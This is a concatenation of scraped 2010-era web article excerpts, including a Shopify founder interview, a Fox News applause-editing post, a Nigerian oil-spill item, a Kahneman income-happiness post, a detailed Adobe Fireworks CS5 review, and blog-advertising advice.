href=\"http://www.snowdevil.ca/\">Snowdevil</a>. How did you decide to start that? How did that lead to Shopify?</strong></p>\n\n\n\t<p>To tell you the truth, the main reason I wanted to start a retail store was because of programming burnout. I had just moved to Canada a year before and was still working for a startup company in Germany. I disliked remote work and found the job isolating, not to mention we did a lot of software development in Java. We mainly worked on financial backend software – the driest of the dry kind of stuff. What I was drawn to was retail and the margins that could be had in the right niches. I also thought that online retail had been implemented poorly thus far. This was in 2004.</p>\n\n\n\t<p>So the idea was to use my technical expertise to give me some leverage in creating an online store. The idea at the time was that this would eventually let me earn my money, without having to do any programming. I loved programming, but I decided back then that I wanted to recover it as a hobby, instead of a day job.</p>\n\n\n\t<p>I set up our online store based on a variety of different systems such as Miva, OsCommerce and Yahoo stores. Truth be told, all those systems made my skin crawl because of how bad they were. The final straw was when I got a custom design made for my snowboard store and I couldn’t get it to work in Yahoo stores. We had this great <span>CSS</span> based layout done with all these new fanged “web standards” and the customizability of Yahoo Stores barely allowed me to change the background color of the top frame (!!!).</p>\n\n\n\t<p>In a moment of utter disgust, I got an IM from a friend who told me about this <a href=\"http://rubyonrails.org/\">Ruby on Rails</a> thing that David just released. I downloaded it, fell in love with it, and decided it wasn’t programming that I was burned out on; it was programming in uninspired programming languages. With my newfound enthusiasm and tools, I spent 2 months building our own Snowdevil store software.</p>\n\n\n\t<p>We had a great season of sales in 2004 and turned a profit, but at this point we had the itch to fix the broken e-commerce industry and create a software that merchants and designers would truly love. I’d say we spent slightly too long working on Shopify before its first release, but ecommerce is complicated, so it took about 1 1/2 years from this point until Shopify’s release in 2006.</p>\n\n\n\t<p>In the end, Shopify is the software that I hoped to find in 2004 for Snowdevil.</p>\n\n\n\t<p><strong>How did you fund yourself at first? Did you ever consider taking on any investors?</strong></p>\n\n\n\t<p>We had a tiny bit of money from the profit of the Snowboard sales. Other than that we essentially funded it by ignoring money. My co-founder Scott and I didn’t take salaries until well after the launch. My wife and I moved in with her parents and kept costs down. I also had some savings from my job in Germany, and friends &amp; family chipped in a bit in exchange for some equity.</p>\n\n\n\t<p>We ended up taking an investment from an angel investor, who just called us up one day because he heard about our company. This is certainly an outlier, but taking this investment from John H. Phillips was probably the best decision we ever made. Apart from allowing us to meet payroll for the first year, he has spent countless hours teaching me all the things I needed to know about running a company. Without him, we simply could not have survived the years and would not be around today.</p>\n\n\n\t<p><a href=\"http://www.shopify.com/\"><img src=\"http://s3.amazonaws.com/37assets/svn/shopify_homepage.png\" width=\"240\" height=\"258\" alt=\"homepage\" style=\"margin:0 10px 5px 0\" align=\"left\"></a>We use Ruby on Rails, we are in the ecommerce space, and we are profitable. That seems to make us a Perfect 10 in the VC world. I’ve spent a lot of time talking to potential investors and meeting with them in person. Contrary to their reputation, I’ve found VCs to be some of the nicest, insightful and kindest people I’ve met. Many of them made introductions that have lead to lasting business advantages, even without any immediate benefit to themselves.</p>\n\n\n\t<p>That said, at the end of the day, our company has been built and bootstrapped. We won this battle. This is the battle that VCs usually help you win. I see private equity as a tool – probably one of the most sophisticated and effective tools if you happen to have the particular problem it solves – but still only one among many options. Luckily, we are at the point where we can self-finance our ambitions. I don’t rule out that we might take an investment in the future, especially if we are up to something particularly costly, but I have no immediate plans.</p>\n<p><a href=\"http://37signals.com/svn/posts/2378-profitable-proud-shopify\">More...</a></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=yC2SHLOrW9E:oSPocz7It00:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/37signals/beMH?a=yC2SHLOrW9E:oSPocz7It00:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/37signals/beMH?d=7Q72WNTAKBA\" border=\"0\"></a>\n</div>"

Given the voting record of the U.S. millitary, you can imagine that it wasn&#39;t the friendliest audience the President has faced, but he&#39;s the president, and a lot of the audience&#39;s commanding officer, so they afforded him a due amount of respect, golf clapping at the appropriate junctures.<br><br>At one point, Obama extolled the success of the Iraq operation, noting that we would be stopping our combat mission there shortly. He was met with some of the most robust applause from the cadets, if for no other reason then they are probably excited not to have to go to Iraq. You can see the speech from the White House website below. The section in question starts at 9:40, and the applause comes at 10:28: <br><br>But, if you watched the speech on Fox&#39;s YouTube channel, you&#39;ll note that no applause can be heard. The troops, apparently, offer only stony silence when the president talks about what he sees as foreign policy accomplishments. Fox will probably say they were picking up some sort of direct feed of the speech that didn&#39;t pick up crowd noise, but as you listen, you can hear the sound from the video cut out entirely. There even seems to be a visible cut to the clip before he begins speaking again. The applause in question begins 0:45 into this video:<br><br><br><br>Surely we&#39;ll be hearing more about this, including some pathetic excuses or perhaps the suspension of an employee. It&#39;s surprising the video is still available on YouTube, but maybe Fox is standing by their applause free version of the speech.<br><br><em>Via <a href=\"http://gothamist.com/2010/05/24/obama_gets_applause_at_west_point_f.php\">Gothamist</a>.</em><br><br><img src=\"http://feeds.feedburner.com/~r/good/lbvp/~4/uJeNZ69Kuvg\" height=\"1\" width=\"1\">"

The US and Europe ignore it.</a> Oil spills are a regular occurrence in Nigeria, about 300 a year, it is estimated over the past 50 years about 1.5 million tons have been dumped in the Delta, equivalent to the Gulf War oil spill (the largest spill on record) or 50+ Exxon Valdez. <br> From the BBC link:<blockquote>Worse may be to come. One industry insider, who asked not to be named, said: \"Major spills are likely to increase in the coming years as the industry strives to extract oil from increasingly remote and difficult terrains. Future supplies will be offshore, deeper and harder to work. When things go wrong, it will be harder to respond.\"\n\nJudith Kimerling, a professor of law and policy at the City University of New York and author of Amazon Crude, a book about oil development in Ecuador, said: \"Spills, leaks and deliberate discharges are happening in oilfields all over the world and very few people seem to care.\"</blockquote><div>\n<a href=\"http://feeds.feedburner.com/~ff/Metafilter?a=51JRoiSsjKo:Z7igdD4Egt8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/Metafilter?i=51JRoiSsjKo:Z7igdD4Egt8:D7DqB2pKExk\" border=\"0\"></a>\n</div>"

Basically, he says that our memories of experiences differ from what really happened during the  experience itself.  </p>\n<p>But what ended up being the catchy soundbite was in the Q&amp;A session after his talk, where he tells us that while millions of dollars won’t buy you happiness, a job that pays $60,000 a year might help.  This is based on a survey of 600,000 Americans:</p>\n<p><strong>“Below 60,000 dollars a year, people are unhappy, and they get progressively unhappier the poorer they get. Above that, we get an absolutely flat line. I mean I’ve rarely seen lines so flat.”</strong></p>\n<p>“Clearly… money does not buy you experiential happiness, but lack of money certainly buys you misery,” he said. But the real trick, Kahneman said, is to spend time with people you like.</p>\n<p>I found this talk through the <a href=\"http://gatesvp.blogspot.com/2010/02/how-much-to-make-you-happy.html\">GatesVP</a> blog, who offers this analysis:</p>\n<blockquote><p>In most parts of the US you already have access to a very good and healthy life at 60k. You’ve pretty much covered everything commonly deemed as a necessity and you probably have some money left over for “entertainment”. So the jump to 90k really just gives you a little more “entertainment” and maybe some bigger stuff, but that’s it.</p>\n<p>And if you’re the type who’s not happy with being in the top 20%, then how much further do you need to go? Top 10%? Top 5%?</p>\n<p>Really, 60k for one job is far enough “ahead of the game” to keep happy those that can be kept happy. And that’s probably why this is true.</p></blockquote>\n<p>According to the <a href=\"http://en.wikipedia.org/wiki/Personal_income_in_the_United_States\">2008 US Census</a>, making 60k a year is in the top 20%.   I pretty much agree, especially with the idea that humans are creatures of comparison.   As long as we’re doing a little bit better than our neighbors, then we tend to be happy.    What do you think?</p>\n<p>You can view the entire TED Talk below.

are fallback options. For the new types, if a browser doesn’t recognize the type it will behave as the “text” type.

The application is known for its versatility, excellent blend of vector and bitmap tools and powerful built-in wireframing and prototyping options. Also, according to the <a href=\"http://sodaspeaks.ning.com/page/digital-marketing-outlook\">SoDA 2010 Digital Marketing Outlook</a> survey, Fireworks has become an important tool for many digital agencies.</p><p>It now has the same standing as other core Adobe products, such as Flash, Flex and Dreamweaver (to the question “Which technical skill sets, if any, will you look to hire or contract in 2010?”, approx. <a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/soda-2010-fireworks-graph-1.png\">12%</a> of the survey respondents replied “Fireworks”, and to the question “Which tools/products will you or your organization use in 2010?”, more than <a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/soda-2010-fireworks-graph-2.png\">44%</a> of the survey respondents replied that they will be using  Fireworks).</p><p>A lot of official Adobe pages cover the latest version of Fireworks, <strong>CS5</strong>, in detail: for example, the new <a href=\"http://www.adobe.com/products/fireworks/\">Fireworks CS5 product page</a>; the Fireworks CS5/CS4/CS3 <a href=\"http://www.adobe.com/products/fireworks/upgrade/?view=compare\">comparison chart</a>; and the pages that highlight Fireworks CS5’s <a href=\"http://www.adobe.com/products/fireworks/web/\">Web workflows</a> and <a href=\"http://www.adobe.com/products/fireworks/design/\">design workflows</a>.</p><p>But none of these official Adobe pages actually answer the question that so many design professionals are asking in the first place: <strong>is Fireworks CS5 really better?</strong> Will it save you time and effort? Are the new features worth the upgrade price? This article gives detailed answers to these questions. We’ll present a neat list of Fireworks CS5’s new features and improved workflows, along with examples of how they will make your work much more efficient.</p><p>[Offtopic: by the way, did you know that there is a Smashing eBook Series? Book #1 is <a href=\"http://shop.smashingmagazine.com/smashing-ebook-series-1-professional-web-design-intl.html\">Professional Web Design</a>, 242 pages for just $9,90.]</p><h3>1. Better Performance</h3><h4>Performance Improvements</h4><p>One of the most notable (and welcome) improvements in the latest version of Fireworks is <strong>performance</strong>. Fireworks CS5 is faster and more lightweight, it uses less RAM and it is much more stable than any previous version of Fireworks.</p><p>For example, look at the following performance graph. Testing was done on a five-year-old Lenovo ThinkPad, with a 1.5 GHz Intel Pentium-M CPU and 1.5 GB of DDR memory.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/performance-graph-1-rv2.png\" alt=\"Performance-graph-1-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \" width=\"500\" height=\"400\"><br> <em>Performance graph of start-up times.</em></p><p>Notice that start-up times are much better for the CS5 version, and Fireworks CS5 may need less than 4 seconds for a “warm” start on a five-year-old machine; some Mac users already report <a href=\"http://twitter.com/brucebowman/status/12606068212\" title=\"Fw CS5 needs less than 4 seconds to start on a Mac (with link to a short video)\">similar performance improvements</a>.</p><p>More <a href=\"http://www.adobe.com/devnet/logged_in/bbowman_fwcs5.html\">performance stats</a>:</p><ul><li>“Cold” launch times improved by 3 to 9% <em>(average)</em></li><li>“Warm” launch times improved by 30 to 32% <em>(average)</em></li><li>Memory (RAM) usage reduced by 2 to 16% <em>(average)</em></li></ul><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/performance-graph-2-rv2.png\" alt=\"Performance-graph-2-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \" width=\"500\" height=\"310\"><br> <em>Graph of general performance improvements.</em></p><p>So, while major new versions of Adobe applications are usually more resource-hungry than their predecessors, seeing that this is actually the opposite case with Fireworks is a pleasant surprise.</p><h4>Better Handling of Files</h4><p>Fireworks CS5 opens and saves PNG files faster, better and more reliably. It also allows you to open multi-page Fireworks PNG files much more easily, because the open dialog shows a preview of all of the pages inside.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/open-and-import-preview.png\" alt=\"Open-and-import-preview in Adobe Fireworks: Is It Worth Switching to CS5? \" width=\"500\" height=\"300\"><br> <em>Multi-page preview in the “Open” and “Import” dialog boxes.</em></p><p><em>(NOTE: Files created in Fireworks CS4 (and earlier versions) will not have the preview option available by default; a Fireworks PNG file must be saved at least <strong>once</strong> in Fireworks CS5 so that the multi-page preview becomes available for this file.)</em></p><h4>Integrated Recovery Options</h4><p>Fireworks CS5 is much stabler than its predecessor. Still, in case the worst happens and Fireworks CS5 suddenly crashes on your Mac, it automatically places a recovered copy of the file in a <em>Recovered Files</em> folder on your desktop. Windows users are protected, too: they can use the <a href=\"http://www.adobe.com/cfusion/marketplace/index.cfm?event=marketplace.offering&amp;marketplaceid=1&amp;offeringid=10210\" title=\"Download the Fireworks AutoBackup extension\">AutoBackup extension</a>, which works perfectly with both Fireworks CS4 and CS5. The extension works on Windows and Mac and automatically saves copies of all opened PNG files at a user-specified interval inside a folder named <em>FWAIRBackup</em> (which is located on the same path as the original file).</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/recovery-options.png\" alt=\"Recovery-options in Adobe Fireworks: Is It Worth Switching to CS5? \" width=\"500\" height=\"185\"><br> <em>Fireworks CS5 Windows and Mac users are protected from data loss.</em></p><h3>2. PI Panel Improvements</h3><p>The powerful <strong>property inspector (or PI) panel</strong> has always been the core of Fireworks and one of its best features. From this panel, you can instantly change almost any available property for almost any selected object on the canvas: vector object, bitmap object, text object, a group of objects, etc.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/pi-panel-overview.png\" width=\"500\" height=\"265\" alt=\"Pi-panel-overview in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>The new PI panel in Fireworks CS5 (overview).</em></p><p>In Fireworks CS5, the PI panel has been largely improved. It now responds much faster, and compared to CS4, the “refresh” times are reduced, especially on Windows. It also has many new features. Let’s look at the four most important ones:</p><h4>New “Constrain Proportions” Option for Resizing Objects</h4><p>No need to use the Numeric Transform tool anymore when you want to resize an object and keep its proportions locked. The new “Constrain Proportions” option on the PI panel simplifies this and saves you time (and a few extra clicks).</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/pi-panel-lock-proportions-rv2.png\" width=\"500\" height=\"270\" alt=\"Pi-panel-lock-proportions-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>The PI panel option to lock the proportions of an object.</em></p><h4>New Dithering Option for Gradients</h4><p>Gradient Dithering is a new feature introduced in Fireworks CS5. When working with gradients, switching the Gradient Dithering option “on” or “off” is now just a click away.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/pi-panel-gradient-dither-rv2.png\" width=\"500\" height=\"180\" alt=\"Pi-panel-gradient-dither-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>PI panel option for switching Gradient Dithering on and off.</em></p><h4>New Stroke Alignment Options</h4><p>Need to change Stroke Alignment properties? You don’t need to open the Stroke options anymore — just use the new Stroke Alignment icons, right on the PI panel.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/pi-panel-stroke-alignment-rv2.png\" width=\"500\" height=\"150\" alt=\"Pi-panel-stroke-alignment-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>The Stroke Alignment options on the PI panel.</em></p><h4>New Compound Shape Tools</h4><p>Fireworks CS5 has a powerful new feature: Compound Shapes <em>(more on this feature later)</em>. Creating and editing them is done easily from the PI panel, too.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/pi-panel-compound-shapes-rv2.png\" width=\"500\" height=\"150\" alt=\"Pi-panel-compound-shapes-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>Editing Compound Shapes on the PI panel.</em></p><h3>3. New Text Engine Features</h3><p>Fireworks CS5 has a much better text engine, with many new features and tiny enhancements that will help in your routine work with text. Here’s a quick list of the enhancements:</p><ul><li>Kerning, tracking and leading between characters in a text block can now be easily controlled using only the keyboard (simply put the cursor in between characters and use the keyboard arrow keys).</li><li>The slider value for kerning and tracking has been increased to 200.</li><li>If you open a PNG file created in Fireworks v. CS3 or lower, the kerning and tracking values will be automatically mapped and the look of the text will be preserved.</li><li>A new option (unique to Adobe Fireworks) allows you to multi-select characters and words in a text box and then style them together at once. This is complemented by another new option that allows you to auto-select similarly styled characters, words or paragraphs inside a text block, and then modify their styles at once.</li><li>An editable and auto-completing font list box feature has been added <em>(Windows version only)</em>.</li><li>Now, you don’t need to restart Fireworks after installing a new font <em>(Windows version only)</em>.</li><li>Undoing (Ctrl/Cmd + Z) and redoing (Ctrl/Cmd + Y) at the character level is now possible while you’re in text-editing mode.</li><li>Double-clicking selects the word, and triple-clicking selects the entire paragraph.</li><li>In the Layers panel, text object layers are now marked with a tiny “T” icon, for easier recognition.</li><li>A Text Overflow indicator appears when extra characters (that don’t fit the text-in-path or text-on-path) exist.</li><li>Copying and pasting text from any version of Microsoft Office into Fireworks is much improved.</li><li>The number of characters that can be copied and pasted into a Fireworks text block at once has been increased from 2000 to 8000.</li></ul><p>(We may highlight and explain text engine improvements in Fireworks CS5 in greater detail in a future article.)</p><h3>4. Improved Adobe CS5 Integration</h3><p>Integration of Fireworks CS5 with other Adobe CS5 applications is much improved.</p><ul><li>Fireworks CS5 now supports <a href=\"http://kuler.adobe.com/links/kuler_help.html#Colors\">ASE swatches</a>, the same color file format supported by Illustrator, Photoshop, InDesign and <a href=\"http://kuler.adobe.com/\">Kuler</a>. The .ASE support will allow designers to easily exchange color schemes between Fireworks and other Adobe products.</li><li>Fireworks CS5 has very good integration with <strong>Adobe Illustrator CS5</strong>. Fireworks CS5 can import graphic assets from Illustrator CS5 almost perfectly, and copying and pasting directly from Illustrator CS5 into Fireworks CS5 is possible with a high level of fidelity and editability, too <em>(there exist only a few exceptions to this)</em>.</li><li>Fireworks CS5 can export in the new <a href=\"http://opensource.adobe.com/wiki/display/flexsdk/FXG+2.0+Specification\">FXG 2.0 file format</a>, and FXG 2.0 files can be imported into Illustrator CS5, Flash Catalyst CS5 and other Adobe programs with almost no loss in editability.</li><li>Fireworks CS5 is integrated with <a href=\"http://www.adobe.com/products/creativesuite/devicecentral/\">Adobe Device Central CS5</a> (read the article about Adobe Fireworks CS5 and Adobe Device Central titled “<a href=\"http://www.adobe.com/devnet/fireworks/articles/mobile_workflows_fw_dc.html\">Mobile workflows using Fireworks CS5 and Device Central CS5</a>“).</li><li>The integration with <strong>Adobe Photoshop CS5</strong> is excellent, too. Fireworks CS5 can import graphic assets from Photoshop CS5 very well. Fireworks CS5 has much better support for Photoshop PSD files. Adjustment Layers in a PSD file now retain their appearance when opened or imported in Fireworks. Gradient round-tripping is now possible between Fireworks and Photoshop.</li></ul><h3>5. Miscellaneous New Tools And Features</h3><h4>Compound Shapes</h4><p>Fireworks CS5 has powerful new vector tools in its toolset, called <strong>Compound Shapes</strong>. Compound Shapes are special vector groups that give you greater vector power. You can create new compound shapes out of existing vector objects and you can also draw in several compound shape modes. A Compound Shape group allows the editing and styling of several vector objects as one, while preserving the original vector objects inside the group. The individual objects can be easily re-edited or ungrouped at any stage.</p><p>To use the new Compound Shapes, simply select several vector objects together, and then use one of the available Compound Shape operations (found on the PI panel): <strong>Add/Union, Subtract/Punch, Intersect, Crop</strong>.</p><p>After you have created a Compound Shape group, editing <strong>individual</strong> objects within the group is easy: simply use the Subselection tool <em>(white arrow)</em> to select and modify any individual object. To edit the Compound Shape group as <strong>one</strong> object, switch to the Pointer tool <em>(black arrow)</em>.</p><p>Here’s a simple example:</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/compound-shape-example-rv2.png\" width=\"500\" height=\"850\" alt=\"Compound-shape-example-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>Example of Compound Shapes.</em></p><p>The introduction of Compound Shapes in Fireworks CS5 gives designers even more flexibility, because the standard vector <strong>combine</strong> workflows (Modify → Combine Paths → Join/Split/Union/Intersect/Punch/Crop) can be complemented by the new <a href=\"http://www.fireworkszone.com/compound-shape-tools_592.html#haut\" title=\"Compound Shapes Tools, a tutorial by Thierrry Lorey\">non-destructive combine vector workflows</a>.</p><p>Compound Shapes are also fun for all kinds of creative artwork:</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/compound-shape-monsters-by-molif.jpg\" width=\"500\" height=\"300\" alt=\"Compound-shape-monsters-by-molif in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>“Monsters,” a creative use of Compound Shapes (illustration by <a href=\"http://www.molif.com/en/2010/04/28/monstrous/\" title=\"Illustration by Ani Kostova (CC-BY-NC-ND license, image used with permission from the author)\">molif.com</a>).</em></p><h4>Dithering Option for Gradients</h4><p>Fireworks CS5 now has a Dithering option for gradients, which almost completely reduces any “banding” in radial or linear gradients.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/gradient-dithering-rv2.png\" width=\"500\" height=\"350\" alt=\"Gradient-dithering-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>The new Gradient Dithering option reduces “banding” in gradients.</em></p><p><em>NOTE: The Gradient Dithering option is available for Radial and Linear gradients only. For now, other types of gradients in Fireworks are not supported.</em></p><h4>Reverse Option for Gradients</h4><p>Fireworks CS5 allows you to easily reverse the direction of any kind of gradient, which can save time.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/gradient-reverse-rv2.png\" width=\"500\" height=\"320\" alt=\"Gradient-reverse-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>Reverse Gradient option.</em></p><h4>Snap-to-Pixel</h4><p><strong>Snap-to-Pixel</strong> is a new feature in Fireworks CS5 that allows you to fix instantly almost any blurriness in a vector object (or a group of objects), after some complex transformations have been applied to it. To apply this command, use <em>Modify → Snap To Pixel</em>, or the Cmd/Ctrl + K shortcut. This is one of the best and most useful new features in Fireworks CS5.</p><h4>Templates</h4><p>Fireworks CS5 introduces Templates. Now you can easily create and share your own PNG templates inside a small or large design team.</p><p>To use this new feature, simply select <em>File → New from Template</em> to open an existing template, or <em>File → Save as Template</em>.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/fw-templates-1.png\" width=\"500\" height=\"390\" alt=\"Fw-templates-1 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>Templates options in the File menu.</em></p><p>Fireworks CS5 comes with several pre-built templates (neatly organized in a few groups: Grid Systems, Mobile, Web, Wireframes, etc.). Users can extend these easily by creating and saving their own templates.</p><h4>Better CSS Export Options</h4><p>Fireworks CS5 has much better CSS and HTML exporting options. Here are some highlights:</p><ul><li>A new option to export multiple pages as CSS, HTML and images at once; a great feature for quickly exporting your designs as dynamic, clickable prototypes.</li><li>It is now possible to tag text objects by tag name to output the text with a particular HTML tag.</li><li>A Text Area symbol has been added for improved HTML-form prototyping.</li><li>There is a List Item symbol to allow for the creation of unordered lists (both normal text lists and lists with links).</li><li>Font sizes are now in percentages to allow for easy and flexible text resizing in all browsers.</li><li><code>Div</code>s with set heights now have <code>min-height</code> equivalents to allow for text resizing and any amount of content.</li><li>Many other small and big improvements have been added to the CSS Export script.</li></ul><h4>Global Preference for Grids</h4><p>In Fireworks CS5, preferences for grids are now global and can be overridden for individual documents.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/grid-settings-rv2.png\" width=\"500\" height=\"490\" alt=\"Grid-settings-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>Global preferences for grids.</em></p><h4>Redesigned Align Panel</h4><p>The Align panel is improved and more powerful. It now remembers the most recent settings used and is more usable.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/align-panel-rv2.png\" width=\"500\" height=\"440\" alt=\"Align-panel-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>Align panel options.</em></p><h4>New “Copy to Clipboard” Option for Colors</h4><p>You can use standard option for copying color values of any selected color, or use the new option for one-click copy of the color value.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/easy-to-copy-color-values.png\" width=\"500\" height=\"150\" alt=\"Easy-to-copy-color-values in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>Copying color #hex values is now easier.</em></p><h4>New “Don’t show again” Option for Resample Dialog</h4><p>When you copy and paste objects between files that have different resolution (<strong>dpi</strong> setting), Fireworks will ask you if you want to resample the pasted vector or bitmap object. While it is certainly useful to have this option, experience have proved that leaving the original dpi setting of the object to be pasted is often the best choice and leads to better results.</p><p>So now in Fireworks CS5, you can select the “Don’t Resample” option and check the “Don’t show again” checkbox. Setting will be remembered and in the long run, this new option may save you time.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/05/dont-show-again-option-for-paste-rv2.png\" width=\"500\" height=\"320\" alt=\"Dont-show-again-option-for-paste-rv2 in Adobe Fireworks: Is It Worth Switching to CS5? \"><br> <em>Better paste options for documents with different dpi settings.</em></p><h3>6. Early (P)reviews</h3><p>Fireworks CS5 was released just a few days ago, but the (p)reviews thus far have been largely positive. Let’s read some of them:</p><blockquote><p>Fireworks CS5 is a very strong release.… For Fireworks CS5, more than with any other release in our history, we listened to our users. They told us that we needed to make sure Fireworks had rock-solid stability and reliability, and that we needed to refine the existing features before thinking about new ones. That’s exactly what we did, and the results are impressive.</p><p>— <a href=\"http://www.adobe.com/devnet/logged_in/bbowman_fwcs5.html\" title=\"Introducing Adobe Fireworks CS5\">Bruce Bowman</a>, Fireworks Product Manager at Adobe</p></blockquote><blockquote><p>I’ve had the unique opportunity to spend some time working with the new Adobe Fireworks CS5, and it has been a pleasure. The stability improvements are immediately noticeable, and although this has been described as a “stability release,” there are some very useful new features that should not be overlooked.… Overall, Adobe Fireworks CS5 is a fantastic release. Stability, new features and a smoother workflow with other Adobe products keep it as the front-runner when designing for pixels on the screen.</p><p>— <a href=\"http://www.idux.com/2010/04/20/top-ten-highlights-of-the-new-adobe-fireworks-cs5/\" title=\"Top Ten Highlights of the New Adobe Fireworks CS5\">David Hogue</a>, Director of Information Design and Usability at <a href=\"http://www.fluid.com/\">Fluid, Inc.</a></p></blockquote><blockquote><p>Aside from the major performance, stability, install and memory enhancements… there are tons of tweaks under the hood of Fireworks CS5!</p><p>— <a href=\"http://www.heathrowe.com/topfwcs5features.aspx\" title=\"My Top Five Fireworks CS5 Features/Enhancements\">Darrel Heath</a>, freelance <a href=\"http://www.heathrowe.com\">web designer and developer</a></p></blockquote><blockquote><p>Adobe has published a really extensive piece surrounding the details behind Fireworks CS5. I’ve talked about it with a few designers, both Fireworks and Photoshop users, and had a gut feeling that it would be mostly a bug-fix release. While every Adobe product under the sun needs at least one full version release consisting of mostly bug fixes, I gladly welcome Fireworks CS5. The fixes mentioned in the piece have me really excited to put more time into working with the application after it’s released.</p><p>— <a href=\"http://mondaybynoon.com/2010/04/17/adobe-fireworks-cs5/\" title=\"Introducing Adobe Fireworks CS5\">Jonathan Christopher</a>, front-end developer at <a href=\"http://overit.com/\">Overit Media</a></p></blockquote><blockquote><p>Fireworks CS5: improved performance, more precise control over the pixel placement of design elements and a streamlined, accelerated workflow.</p><p>— <a href=\"http://www.webdesignerdepot.com/2010/04/adobe-creative-suite-5-brings-sexy-back/\" title=\"Adobe Creative Suite 5 Brings Sexy Back\">Webdesigner Depot</a></p></blockquote><blockquote><p>Adobe Fireworks CS5 is better than ever. The engineers searched high and low to find ways to make Fireworks faster, more stable and easier to use. I know I’m impressed and I hope… you will be too!</p><p>— Jim Babbage, author at <a href=\"http://www.lynda.com\">Lynda.com</a> (<a href=\"http://www.communitymx.com/content/article.cfm?cid=C2E1D\" title=\"Fireworks CS5 New Features - Overview\">Part 1</a>, <a href=\"http://www.communitymx.com/content/article.cfm?cid=3DE48\" title=\"Fireworks CS5 New Features - Part 2\">Part 2</a>)</p></blockquote><blockquote><p>Enjoy the increased stability and polish in Fireworks CS5. If you haven’t upgraded in a while and passed over CS4 as some people I know have done, don’t pass on CS5. It will make your current workflows much smoother and does add a few welcome new features. I highly recommend it!</p><p>— <a href=\"http://www.pixelyzed.com/2010/05/17/a-quick-review-of-fireworks-cs5/\" title=\"A Quick Review of Fireworks CS5\">Stéphane Bergeron</a>, freelance Web designer at <a href=\"http://www.webfocusdesign.com/en/\">Webfocus Design</a></p></blockquote><h3>7. Conclusion</h3><p>So, <strong>is Fireworks CS5 really better?</strong> For me, it is. Fireworks CS5 may not be absolutely perfect or contain any “wow” features. But at the same time, it is a very welcome release — fast, stable, polished, with lots of tiny refinements and additions that will make your design work more efficient.</p><p>I wasn’t able to list all of the new features and improvements in Fireworks CS5, but I hope your curiosity now is piqued enough that you will want to try Fireworks CS5 soon.

There is no right or wrong answer to that question, ultimately you have control over what advertisements are shown, but will advertising turn off some of your readers? Before you jump into anything, it’s a good idea to sort through the pros and cons. Here are some things you should consider before you make that jump.</p>\n<h3>Why advertise?</h3>\n<p>To monetize your site or blog is often the first answer given, and with good reason. Your time is valuable. But are there other ways you can make money without advertising? Is it really necessary to sell valuable real estate on your site to gain a few extra pounds (or dollars?) Maybe your site is more suited toward monetizing your brand through merchandising, or offering paid services?</p>\n<h3>Should you use an advertising marketplace or fly solo?</h3>\n<p>Many of the blogs in the design community use <a href=\"http://www.buysellads.com\">BuySellAds</a> to manage their advertisements. Allowing a company like BSA to handle your ads, saves you time, connects you with a growing marketplace, and improves renewal rates.</p>\n<p>However for many people, 25% commission is a tough pill to swallow, and perhaps you’d like a little more control. Could you just handle everything by yourself? Of course you could. You can simply use a PayPal account and solicite advertisers. This way you are on a more personal level with your advertisers. You will have plenty of control over who is advertising, and you will be able to build up long term relationships with your advertisers.</p>\n<p>Advertising needs to be targeted to the correct audience, selling your own ad space will allow you to control the kinds of products and services sold on your site. For example, on <a href=\"http://www.designjuices.co.uk/\">my site</a> I have turned down offers from online betting sites and other questionable services because they aren’t targeted towards my users.</p>\n<h2>Your stats matter</h2>\n<p>Improving your statistics is important. Advertisers will be concerned with your page views, Google ranking, Alexa rank and more.</p>\n<h3>A little about your Alexa rank</h3>\n<p>If you don’t know what <a href=\"http://www.alexa.com/\">Alexa</a> is, you should definitely check them out. They are a web information company 